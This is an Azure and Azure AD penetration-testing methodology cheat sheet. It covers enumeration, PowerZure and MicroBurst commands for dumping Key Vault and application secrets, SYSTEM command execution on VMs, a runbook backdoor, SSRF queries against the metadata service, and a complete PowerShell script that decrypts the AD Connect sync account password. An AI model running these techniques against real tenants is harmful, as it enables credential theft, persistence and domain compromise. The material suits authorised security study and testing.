---
description: Audit Microsoft Azure
---

# Azure

## Azure

## Introduction

* Infrastructure as a Service (IaaS), as well as Software as a Service (SaaS)
* Access
  * Web (Portal)
  * API
  * CLI (Powershell modules MSOnline and AzureAD)
    * `Install-Module -Name MSOnline -Force`
    * `Install-Module -Name AzureAD -Force`
  * RDP/WinRM/SSH
* **Enterprise** This represents the Azure global account
  * **Tenants** are instances of Azure for the Enterprise. An Enterprise can have multiple tenants. Access to one tenant in an enterprise does not give access to another tenant. Tenants are similar to Forests in Active Directory, where trusts can be established
  * **Subscriptions** are how you gain access to Azure services e.g. a subscription for production web apps, another subscription for development web apps
  * **Resources** are the specific application, such as SQL servers, SQL DBs, virtual networks, run-books
  * **Resource** groups are the containers that house the resources. Business will often have multiple resource groups depending on their usage of the resource.
  * **Runbooks** are part of the Azure Automation service and support scripting languages PowerShell and Python (2.7)
  * **Azure** Active Directory (Azure AD) is directory services in the cloud.
  * **Azure** AD connect is the tools that actually connects on-premise with Azure AD
  * **Service Principal** is a security identity used by user-created apps Think of it as a ‘user identity’ (login and password or certificate) with a specific role, and tightly controlled permissions to access your resources It improves security if you only grant it the minimum permissions level needed to perform its management tasks
* Azure AD is not a replacement for on-premise AD. It’s mostly just a management platform for AD from the cloud
* Three primary ways of integrating on-premise Active Directory to Azure AD, **Password Hash Synchronization (PHS**), **Pass Through Authentication (PTA)**, and **Federated Services (ADFS)**

### Integrate Microsoft AD to AAD

#### Password Hash Synchronization (PHS)

The passwords from on-premise AD are actually sent to the cloud, similar to how domain controllers synchronize passwords between each other via replication. **This is done from a service account that is created with the installation of AD Connect.**

**Attack path**: if the synchronization account is compromised, it has enough privileges that it potentially could lead to the compromise of the on-premise AD forest, as that account is granted replication rights which are needed for DCSync

#### Pass Through Authentication (PTA)

Keeps the passwords on-premise but also allows the users to have a single password for Azure and on-premise. For example, when a user logins to Outlook on the web, they enter their credentials into the web portal (Azure AD), which Azure then uses PKI to encrypt the credentials and sends them to an agent on-premise. The agent decrypts the credentials and validates it against the DC, which returns a status back to the agent, which is then relayed back to Azure AD.

**Attack path**: Possible to perform DLL injection into the PTA agent and intercept authentication requests, which include credentials in clear-text

#### Active Directory Federated Services (ADFS)

Azure AD can connect back to on-premise via ADFS. With ADFS, Azure AD is set as a trusted agent for federation and allows login with on-premise credentials.

### Access Control

#### Policies

Policies in Azure do not do the actual controlling of access, they are meant to enforce different rules and effects for resources (maximum size of VM ...)

#### Role Based Access Control (RBAC) and Roles

It differs from Policies by focusing on user actions at different scopes.

Many businesses rely on the built-in roles

* Global Administrator
* Global Owner
* Global Contributor
* Global Reader

Resources can have their own specific access control list (ACL)

Important to note that roles/permissions are inheritance-based, meaning if a user is in the Contributor role for the resource group, they will effectively have Contributor access to every resource within the resource group. Even if they are only assigned to the reader role for a resource within that resource group

#### Useful links

* Environnement Office365 : [https://www.office.com](https://www.office.com)
  * [https://outlook.office.com/mail/](https://outlook.office.com/mail/)
* Environnement Azure : [https://portal.azure.com](https://portal.azure.com)
* [https://myapps.microsoft.com](https://myapps.microsoft.com) -> [https://account.activedirectory.windowsazure.com/r#/applications](https://account.activedirectory.windowsazure.com/r#/applications)
* AAD publicly available endpoint: [https://autologon.microsoftazuread-sso.com/](https://autologon.microsoftazuread-sso.com)
  * Accepts Kerberos tickets and translates them into SAML and JWT tokens, which are understood and trusted by other cloud services like O365/Azure ...

## Methodology

### Reco

`host <DOMAIN_NAME>`

#### Google dork

* Cloud uses predefined subdomains which helps an attacker to quickly identify resources
  * \*.azureedge.net, \*.core.windows.net, \*.azure-api.net
* GitHub / Shodan.io / Archive.org
* Leaked Storage Account Keys: [https://github.com/search?q=DefaultEndpointsProtocol\&type=Code](https://github.com/search?q=DefaultEndpointsProtocol\&type=Code)
  * Check the value of the `AccountKey` field

#### Network scan

* Vnet Gateway
  * 443/tcp, 8443/tcp, 8444/tcp, 10001/tcp, 10002/tcp, 20000/tcp
  * 500/udp
* Azure SQL Server
  * 443/tcp, 1433/tcp, 1434/tcp, 1439/tcp, 5002/tcp, 5022/tcp, 5024/tcp, 8000/tcp
* Azure Web App
  * 80/tcp, 443/tcp , 454/tcp, 455/tcp , 1221/tcp, 4016/tcp, 4018/tcp, 4020/tcp

### Anonymous

#### Unauthenticated enumeration

* Azure services enumeration
  * `Invoke-EnumerateAzureSubDomains -Base "<DOMAIN_NAME>" -Verbose`
  * [https://blog.netspi.com/enumerating-azure-services/](https://blog.netspi.com/enumerating-azure-services/)
* Blob enumeration
  * `Invoke-EnumerateAzureBlobs -Base "<NAME>"`
  * [https://blog.netspi.com/anonymously-enumerating-azure-file-resources/](https://blog.netspi.com/anonymously-enumerating-azure-file-resources/)

### Authenticated

Command requiring authentication display an authentifcation frame for the Microsoft account. Two frames are opened, choose in the 1st one the subscription for the application you want to test

#### Account token theft & reuse

Cloud authentication typically results in a token stored in the authenticated app or web browser, this is the proof of authentication and could be reused. The web browser typically stores this auth token as a cookie.

#### Reader

**Reader** is an account with Reader privileges, they can read Runbooks. Runbooks fall under the “Automation Accounts” resource see if there’s any hard-coded credentials within those Runbooks.

As a Reader, you can also read several other resource’s details to search for hard-coded credentials or other potentially interesting information

* Logic apps
* Deployment Templates
* Virtual Networks (Potentially useful to view new targets/address spaces)
* Export Templates on Virtual Machines
* Connection Strings in Azure SQL
* Configurations on several other resources/applications
* Gathering all users, groups, roles, etc. Runbooks can also be read.

**Information Gathering**

* Reading Deployment Parameters: (Powershell cmdlet) `Get-AzureRmResourceGroup | Get-AzureRmResourceGroupDeployment >> "Deployments.txt"`
  * Looking for config templates with Cleartext Credentials/Keys ..
* Reading App Services Configurations
  * Not enabled for default Reader access (Often granted to Developers with Reader access)
  * SQL DB (AzureSQL, MSSQL)
* (MicroBurst) `Get-AzureDomainInfo -folder MicroBurst -Verbose`

| Function PowerZure      | Description                                                                         | Role   |
| ----------------------- | ----------------------------------------------------------------------------------- | ------ |
| **Get-CurrentUser**     | Returns the current logged in user name, their role + groups, and any owned objects | Reader |
| **Get-AllUsers**        | Lists all users in the subscription                                                 | Reader |
| **Get-User**            | Gathers info on a specific user                                                     | Reader |
| **Get-AllGroups**       | Lists all groups + info within Azure AD                                             | Reader |
| **Get-Resources**       | Lists all resources in the subscription                                             | Reader |
| **Get-Apps**            | Lists all applications in the subscription                                          | Reader |
| **Get-GroupMembers**    | Gets all the members of a specific group. Group does NOT mean role.                 | Reader |
| **Get-AllGroupMembers** | Gathers all the group members of all the groups.                                    | Reader |
| **Get-AllRoleMembers**  | Gets all the members of all roles. Roles does not mean groups.                      | Reader |
| **Get-Roles**           | Lists the roles in the subscription                                                 | Reader |
| **Get-RoleMembers**     | Gets the members of a role                                                          | Reader |
| **Get-Sps**             | Returns all service principals                                                      | Reader |
| **Get-Sp**              | Returns all info on a specified service principal                                   | Reader |
| **Get-Apps**            | Gets all applications and their Ids                                                 | Reader |
| **Get-AppPermissions**  | Returns the permissions of an app                                                   | Reader |
| **Get-WebApps**         | Gets running web apps                                                               | Reader |
| **Get-WebAppDetails**   | Gets running webapps details                                                        | Reader |

**Secret Gathering**

| Function PowerZure | Description          | Role   |
| ------------------ | -------------------- | ------ |
| **Get-KeyVaults**  | Lists the Key Vaults | Reader |

**Data Exfiltration**

| Function PowerZure       | Description                                            | Role   |
| ------------------------ | ------------------------------------------------------ | ------ |
| **Get-StorageAccounts**  | Gets all storage accounts                              | Reader |
| **Get-StorageContents**  | Gets the contents of a storage container or file share | Reader |
| **Get-Runbooks**         | Lists all the Runbooks                                 | Reader |
| **Get-RunbookContent**   | Reads content of a specific Runbook                    | Reader |
| **Get-AvailableVMDisks** | Lists the VM disks available.                          | Reader |
| **Get-VMs**              | Lists available VMs                                    | Reader |

#### Contributor

**Contributor** allows you to actually edit resources and services within Azure

* Contributor Level Access on Virtual Machines, NT Authority\SYSTEM command execution on VMs
  * (MicroBurst) https://blog.netspi.com/running-powershell-scripts-on-azure-vms
  * (PowerZure) `Execute-Command -OS <NAME_OS> -ResourceGroup <NAME_RG> -VM <NAME_VM> -Command <COMMAND>`
  * (PowerZure) `Execute-MSBuild -ResourceGroup <NAME_RG> -VM <NAME_VM> -File <PATH_FILE>`

| Function                  | Description                                                                                                    | Role        |
| ------------------------- | -------------------------------------------------------------------------------------------------------------- | ----------- |
| **Execute-Command**       | Executes a command on a specified VM                                                                           | Contributor |
| **Execute-MSBuild**       | Executes MSBuild payload on a specified VM. By default, Azure VMs have .NET 4.0 installed. Will run as SYSTEM. | Contributor |
| **Execute-Program**       | Upload (`Get-AzVMCustomScriptExtension`) and execute (`az vm run invoke`) any file that is supplied            | Contributor |
| **Upload-StorageContent** | Uploads a supplied file to a storage share.                                                                    | Contributor |
| **Stop-VM**               | Stops a VM                                                                                                     | Contributor |
| **Start-VM**              | Starts a VM                                                                                                    | Contributor |
| **Restart-VM**            | Restarts a VM                                                                                                  | Contributor |
| **Start-Runbook**         | Starts a specific Runbook                                                                                      | Contributor |

* Contributor Level Access on Storage Account
  * Containers, files, configuration files, passwords, keys
    * Backdoor office documents

| Function                   | Description                                                                                     | Role        |
| -------------------------- | ----------------------------------------------------------------------------------------------- | ----------- |
| **Get-StorageAccountKeys** | Gets the account keys for a storage account                                                     | Contributor |
| **Get-VMDisk**             | Generates a link to download a Virtual Machiche's disk. The link is only available for an hour. | Contributor |

* Contributor Level Access on Virtual Disks
  * Ability to copy a disk off to another Azure VM
    * Steal hash
      * https://fortynorthsecurity.com/blog/obtain-d-c-hashes-within-azure-in-4-easy-steps/
* Contributor Level Access to Key Vaults/App Services
  * (PowerZure) `Get-AllKeyVaultContents` will automatically go through a Key Vault, check for access, and print the results of any secrets, keys, or certificates.
  * (MicroBurst) `Get-AzurePasswords -Verbose | Out-GridView`
    * https://blog.netspi.com/get-azurepasswords/
  * (PowerZure) `Get-AllAppSecrets` will return all passwords or certificate credentials for any Application
  * (PowerZure) `Get-AllSecrets` is a catch-all; it will run return all Key Vault secrets/keys/credentials, App Secrets, and Automation Account Run-as credentials.

| Function                      | Description                                                                  | Role        |
| ----------------------------- | ---------------------------------------------------------------------------- | ----------- |
| **Get-KeyVaultContents**      | Get the secrets from a specific Key Vault                                    | Contributor |
| **Get-AllKeyVaultContents**   | Gets ALL the secrets from all Key Vaults.                                    | Contributor |
| **Get-AppSecrets**            | Returns the application passwords or certificate credentials                 | Contributor |
| **Get-AllAppSecrets**         | Returns all application passwords or certificate credentials (If accessible) | Contributor |
| **Get-AllSecrets**            | Gets ALL the secrets from all Key Vaults and applications.                   | Contributor |
| **Get-AutomationCredentials** | Gets the credentials from any Automation Accounts                            | Contributor |

* Contributor Level Access to Automation Accounts
  * (MicroBurst) `Get-AzureKeyVaults-Automation -ExportCerts Y -Subscription "<SUBSCRIPTION-NAME>" -Verbose | ft -AutoSize`
    * https://blog.netspi.com/azure-automation-accounts-key-stores/

#### Owner

**Owners** can do everything a Contributor can do, but they have one additional feature: They can also give permission to a resource they own.

* Listing available subscriptions
  * (Powershell) `az account list --output table`
* Switching subscriptions
  * (Powershell) `az account set --subscription "<NAME>"`

**Operational**

| Function PowerZure | Description                                                            | Role  |
| ------------------ | ---------------------------------------------------------------------- | ----- |
| **Set-Role**       | Sets a role for a specific user on a specific resource or subscription | Owner |
| **Remove-Role**    | Removes a user from a role on a specific resource or subscription      | Owner |

#### Tenant Admin / Administrator

**Administrators** over a subscription have the ability to do everything an Owner can, plus create additional users and groups within Azure AD. They also have the ability to assign roles for the subscription.

* [https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/](https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/)

**Operational**

* (MicroBurst) [https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/](https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/)

| Function PowerZure   | Description                                                                                                | Role          |
| -------------------- | ---------------------------------------------------------------------------------------------------------- | ------------- |
| **Create-Backdoor**  | Creates a Runbook that creates an Azure account and generates a Webhook to that Runbook                    | Administrator |
| **Execute-Backdoor** | Executes the backdoor that is created with "Create-Backdoor". Needs the URI generated from Create-Backdoor | Administrator |
| **Set-Group**        | Adds a user to a group                                                                                     | Administrator |

### Attacks

#### SSRF

* Header : `Metadata: true`
  * `curl -H Metadata:true`
  * `curl –H @{‘Metadata’=’true’}`

[https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)

* `curl -H Metadata:true http://169.254.169.254/metadata/instance?api-version=AAAA-MM-DD | jq .`

```
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance?api-version=AAAA-MM-DD
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=AAAA-MM-DD&format=text

http://127.0.0.1:<PORT>
```

* [https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#cea8](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#cea8)
* [https://azure.microsoft.com/en-us/blog/announcing-general-availability-of-azure-instance-metadata-service/](https://azure.microsoft.com/en-us/blog/announcing-general-availability-of-azure-instance-metadata-service/)

#### Exploit Replicating Directory Changes account (PHS)

* [https://blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/) (First part)
* HTB Monteverde : [https://github.com/s-lck/Writeups-HackTheBox/blob/master/HTB-Monteverde.md](https://github.com/s-lck/Writeups-HackTheBox/blob/master/HTB-Monteverde.md)
* ADSync service account : AAD\_XXXXX
* AD DS Connector account : MSOL\_XXXXX

```powershell
$client = new-object System.Data.SqlClient.SqlConnection
$PASS='4n0therD4y@n0th3r$'
$client.Connectionstring= "Server=LocalHost;Database=ADSync;Trusted_Connection=True;uid=mhope;pwd=$PASS;"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

#### Exploit Azure AD Connect server (PTA)

[https://blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/) (Second part)

#### Exploit ADFS

* [https://www.slideshare.net/DouglasBienstock/troopers-19-i-am-ad-fs-and-so-can-you](https://www.slideshare.net/DouglasBienstock/troopers-19-i-am-ad-fs-and-so-can-you)
  * `adfs.<DOMAIN_NAME>.<TLD>`
  * `sts.<DOMAIN_NAME>.<TLD>`
  * `fs.<DOMAIN_NAME>.<TLD>`
  * `<URL>/adfs/ls/`
  * Try to authenticate and see if redirected
  * `<URL>/adfs/idpinitiatedsigon.aspx`
    * Password spraying
    * List SAML-enabled services
  *   Enpoints:

      ```
      /adfs/services/trust/2005/windowstransport
      /adfs/services/trust/13/windowstransport
      /FederationMetadata/2007-06/FederationMetadata.xml
      /adfs/services/trust/mex
      ```
  * Leak internal hostname of the ADFS server
  * Kill service "Microsoft Identity Server Service Host
  * Patch DLL
  * Restart service
* [https://github.com/fireeye/ADFSDump](https://github.com/fireeye/ADFSDump)
  * C# tool, has to be compiled
  * Must be run on ADFS server as the ADFS account
    * Read information from Active Directory and from the AD FS Configuration Database that is needed to generate forged security tokens.
      * Only the AD FS service account has the permissions needed to access the configuration database
      * ADFSDump must be run locally on an AD FS server
        * Windows Internal Database WID can only be accessed locally via a named pipe
          * `\pipe\MICROSOFT##WID\tqsl\query`
* [https://github.com/fireeye/ADFSpoof](https://github.com/fireeye/ADFSpoof)
  * Python tool&#x20;
  * This tool is meant to be used in conjunction with ADFSDump
  * Tool to forge AD FS security tokens.

## Tools

### AADInternals

[https://github.com/Gerenios/AADInternals](https://github.com/Gerenios/AADInternals)

### Powershell cmdlt

* `Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name`

### MicroBurst

* [https://github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)
* `Import-Module .\MicroBurst.psm1`

### Azurite

* [https://github.com/FSecureLABS/Azurite](https://github.com/FSecureLABS/Azurite)

### azucar

* [https://github.com/nccgroup/azucar](https://github.com/nccgroup/azucar)

### cs-suite

* [https://github.com/SecurityFTW/cs-suite](https://github.com/SecurityFTW/cs-suite)

### adconnectdump

* [https://github.com/fox-it/adconnectdump](https://github.com/fox-it/adconnectdump)

### PowerZure

[https://github.com/hausec/PowerZure](https://github.com/hausec/PowerZure)

* Require the `az` module
* Then requires sign in before usage of the functions
  * Three types of logins for Azure CLI
    * Interactive. Simply type az login and you will be directed to a login page. Mandatory if MFA enabled
    * Cached token. Tokens for Azure are cached in `C:\Users\[Name]\.Azure\accessTokens.json`
      * **An access token can be stolen and re-used** (e.g in RedTeam)
    * Pass in credentials `az login -u User -p Password`
* Mandatory / Operational / Information Gathering / Secret Gathering / Data Exfiltration

A subscription must be set if there are multiple subscriptions so the script will know which to operate against : `Set-Subscription -Id <ID>`

* `ipmo .\PowerZure`

### Get-AzureADPSPermissions.ps1

Script to list all delegated permissions and application permissions in Azure AD

* [https://gist.github.com/psignoret/41793f8c6211d2df5051d77ca3728c09](https://gist.github.com/psignoret/41793f8c6211d2df5051d77ca3728c09)
